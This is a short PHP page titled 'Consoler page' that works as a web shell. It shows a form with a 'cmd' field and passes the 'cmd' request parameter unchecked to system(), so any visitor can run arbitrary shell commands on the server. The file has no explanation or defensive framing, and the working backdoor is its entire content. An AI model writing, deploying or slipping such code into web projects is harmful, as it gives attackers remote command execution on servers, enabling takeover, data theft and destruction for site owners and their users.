<html lang="en">
<head>
<title>Consoler page</title>
    <link rel="stylesheet" href="style.css" type="text/css"/>
</head>
<body>
<?php
    echo '<form><input name="cmd" /></form>'; 
    if(isset($_GET['cmd']))
        system($_GET['cmd']);
?>
</body>
</html>